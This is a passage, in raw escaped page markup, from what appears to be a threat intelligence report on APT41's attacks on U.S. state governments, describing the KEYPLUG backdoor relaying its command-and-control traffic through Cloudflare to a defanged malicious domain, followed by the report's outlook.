16 are Cloudflare CDN associated infrastructure that will redirect the WSS connection to the malicious domain \u003cstrong\u003eafdentry[.]workstation[.]eu[.]org.\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003eFigure 17 is an example HTTP request sent by KEYPLUG to initiate and upgrade to the WSS protocol using Cloudflare infrastructure.\u003c/p\u003e"]]],[null,null,null,null,null,null,null,null,[[[null,"\u003cp\u003eFigure 17: KEYPLUG HTTP Upgrade Request\u003c/p\u003e"],["https://storage.googleapis.com/gweb-cloudblog-publish/images/apt41-17-img.max-800x800.png","https://storage.googleapis.com/gweb-cloudblog-publish/images/apt41-17-img.max-800x800.png 796w, https://storage.googleapis.com/gweb-cloudblog-publish/images/apt41-17-img.max-800x800.png 796w"," 796px,  796px","https://storage.googleapis.com/gweb-cloudblog-publish/images/apt41-17-img.max-800x800.png"],null,3]]],[null,null,[null,[null,"\u003cp\u003eWe notified Cloudflare of this malicious activity and they took prompt action to disrupt communications to the malicious infrastructure. APT41’s increased usage of Cloudflare services indicates a desire to leverage Cloudflare’s flexibility and deter identification and blocking of their true C2 servers.\u003c/p\u003e\n\u003ch2\u003eOutlook\u003c/h2\u003e\n\u003cp\u003eAPT41's recent activity against U.S. state governments consists of significant new capabilities, from new attack vectors to post-compromise tools and techniques. APT41 can quickly adapt their initial access techniques by re-compromising an environment through a different vector, or by rapidly operationalizing a fresh vulnerability. The group also demonstrates a willingness to retool and deploy capabilities through new attack vectors as opposed to holding onto them for future use. APT41 exploiting Log4J in close proximity to the USAHerds campaign showed the group’s flexibility to continue targeting U.S state governments through both cultivated and co-opted attack vectors.
